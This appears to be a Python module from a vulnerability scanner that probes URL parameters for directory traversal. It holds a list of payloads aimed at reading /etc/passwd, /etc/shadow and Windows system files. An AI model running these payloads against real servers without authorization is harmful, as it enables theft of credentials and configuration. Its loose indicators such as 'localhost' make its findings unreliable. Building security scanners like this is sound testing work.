"""
ShadowScan — Directory Traversal Detection Module
Author  : Noah Mordan
License : MIT

Tests URL parameters for path traversal vulnerabilities by injecting
common traversal payloads and checking for leaked file content.
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
]

TRAVERSAL_INDICATORS = [
    "root:x:0:0",
    "daemon:",
    "[fonts]",
    "[extensions]",
    "127.0.0.1",
    "localhost",
    "/bin/bash",
    "/bin/sh",
    "www-data",
]

FILE_PARAMS = [
    "file", "filename", "path", "page", "include",
    "doc", "document", "folder", "root", "dir",
    "template", "php_path", "load", "view", "src",
]


def scan_traversal(url: str) -> list:
    results = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    all_params_to_test = list(params.keys()) + [
        p for p in FILE_PARAMS if p not in params
    ]

    for param_name in all_params_to_test:
        for payload in TRAVERSAL_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = [payload]
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            try:
                response = requests.get(test_url, timeout=8, verify=False)
                body = response.text

                for indicator in TRAVERSAL_INDICATORS:
                    if indicator in body:
                        results.append({
                            "module": "Directory Traversal",
                            "severity": "Critical",
                            "title": f"Directory Traversal detected via parameter '{param_name}'",
                            "description": (
                                f"The server returned content from a system file when the parameter "
                                f"'{param_name}' was set to a traversal payload. An attacker could "
                                f"read arbitrary files from the server filesystem, including credentials "
                                f"and configuration files."
                            ),
                            "evidence": (
                                f"Payload: {payload}  |  "
                                f"Indicator found: '{indicator}'  |  "
                                f"URL: {test_url}"
                            ),
                            "recommendation": (
                                "Sanitize all file path inputs. Use a whitelist of allowed files or directories. "
                                "Resolve paths server-side and verify they remain within the intended base directory. "
                                "Never pass raw user input directly to filesystem functions."
                            ),
                        })
                        break
            except requests.RequestException:
                pass

    if not results:
        results.append({
            "module": "Directory Traversal",
            "severity": "Info",
            "title": "No Directory Traversal detected",
            "description": "No filesystem content was exposed through the tested parameters.",
            "evidence": None,
            "recommendation": "Test file-serving endpoints and APIs that reference server-side paths.",
        })

    return results
